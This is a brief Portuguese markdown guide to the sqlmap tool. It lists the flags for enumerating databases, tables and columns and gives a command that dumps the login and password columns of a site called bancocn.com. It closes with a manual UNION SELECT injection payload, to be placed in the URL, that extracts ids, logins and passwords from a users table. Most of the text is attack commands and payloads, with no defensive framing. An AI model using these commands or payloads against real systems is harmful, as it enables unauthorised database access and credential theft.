# Como usar SQLMAP 💉🗺️🌐
## Flags:
- "-U ou -r" (Faz requisição http para o site ou lê cabeçalho com id de sessão armazenado para conexão que bypassa Web Application Firewall)
- "-D" (nome database)
- "-T" (nome tabela)
- "-C" (nome coluna)
- "--dbs" (lista bancos de dados)
- "--tables" (lista tabelas)
- "--columns" (lista colunas)
- "--dump" (faz dump das informações das colunas)

## Sintaxe
"sqlmap -u (link) --dbs" <strong>OU</strong> "sqlmap -r (header) --dbs" <br>
"sqlmap -u (link) -D (banco de dados selecionado)" <br>
"sqlmap -u (link) -D (banco de dados selecionado) --tables (lista tabelas)" <br>
"sqlmap -u (link) -D (banco de dados selecionado) -T (nome da tabela selecionada)" <br>
"sqlmap -u (link) -D (banco de dados selecionado) -T (nome da tabela selecionada) --columns (lista colunas)" <br>
"sqlmap -u (link) -D (banco de dados selecionado) -T (nome da tabela selecionada) -C (seleciona colunas, separe as colunas por vírgulas) --dump (para exibí-las)" <br>

## Exemplo
<strong>sqlmap -u [http://bancocn.com] -D bancocn -T users -C login,password --dump</strong>

## Exploitation BancoCN SQL Injection
<code>-1 UNION SELECT 1,2,group_concat(id,";",login,";",password) FROM users</code>
### Substitua a partir do número 1 da URL, por essa instrução de consulta SQL, onde serão retornados na tela os dados da tabela users do Banco CN, esta instrução solicita de forma concatenada as requisições dos campos id, login e password da tabela USERS.
